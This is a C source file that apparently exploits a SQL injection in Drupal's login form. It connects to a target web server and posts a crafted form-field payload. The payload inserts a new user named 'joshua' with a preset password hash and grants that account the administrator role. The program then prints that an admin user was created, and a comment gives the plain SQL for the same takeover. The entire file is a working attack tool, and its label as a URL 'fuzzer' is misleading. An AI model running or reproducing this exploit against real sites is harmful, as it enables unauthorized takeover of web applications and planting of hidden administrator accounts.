#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 80

#define MAXLINE 750

int main(int argc, char *argv[]) {

    char * url = {0};
    struct hostent *host;
    struct in_addr h_addr;

    if(argc != 2) {
        puts("[ERROR] Please provide a URL to fuzz");
        return 1;
    } else {

        url = argv[1];

        if ((host = gethostbyname(argv[1])) == NULL) {
          fprintf(stderr, "[ERROR] nslookup failed on '%s'\n", argv[1]);
          exit(1);
        }

        h_addr.s_addr = *((unsigned long *) host->h_addr_list[0]);
        fprintf(stdout, "[INFO] Address resolved: %s\n", inet_ntoa(h_addr));
    }

    struct sockaddr_in dest;
    int sockfd;

    // Create socket file descriptor.
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Populate dest with relevant data.
    dest.sin_family = AF_INET;  //AF = Address Family, INET = Internet
    dest.sin_addr.s_addr = inet_addr(inet_ntoa(h_addr)); //helps with Endianness
    dest.sin_port = htons(PORT); //helps with Endianness

    // Create a TCP connection. If connection fails, exit.
    int result = connect(sockfd, (struct sockaddr *)&dest,sizeof(struct sockaddr));

    if(result != 0)
    {
        puts("[ERROR] Unable to establish connection!");
        return 1;
    }

    char request[MAXLINE + 1], response[MAXLINE + 1];
    char* ptr;
    char* page = "/?q=node&destination=node";
    
    /* Add new user:
    # insert into users (status, uid, name, pass) SELECT 1, MAX(uid)+1, 'admin', 
             '$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld' FROM users
    #
    # Set administrator permission (rid = 3):
    # insert into users_roles (uid, rid) VALUES ((SELECT uid FROM users WHERE name = 'admin'), 3)
    */
    char* payload = "name[0%20;insert+into+users+(status,+uid,+name,+pass)+"
                    "SELECT+1,+MAX(uid)%2B1,+%27joshua%27,+"
                    "%27$S$DWRRJaRWFcRFTjpvPsuSu.7CMFuKG3e7uRSI25Yf2a0mZrUYjv44%27+FROM+users;"
                    "insert+into+users_roles+(uid,+rid)+VALUES+((SELECT+uid+FROM+users+WHERE+name+%3d+%27joshua%27),+3);;"
                    "#%20%20]=test&name[0]=test&pass=nothing&form_build_id=&form_id=user_login_block&op=Log+in";

    // POST request
    snprintf(request, MAXLINE + 1, 
	     "POST %s HTTP/1.1\r\n"
	     "Host: %s\r\n"
         "Accept: */*\r\n"
         "Content-Length: %li\r\nAccept-Language: en-us\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0\r\n"
         "Connection: keep-alive"
	     "\r\n\r\n"
         "%s",
	     page, url, strlen(payload), payload);

    size_t n;

    // Write the request
    if (write(sockfd, request, strlen(request))>= 0) 
    {
        // Read the response 
        while ((n = read(sockfd, response, MAXLINE)) > 0) 
    	{
      	    response[n] = '\0';

            if(strstr(response, "mb_strlen() expects parameter 1") != NULL)
                puts("[!$!] Vulnerable");
    	}

        puts("[!$!] Admin user was created!"); 
    }

    return 0;
}
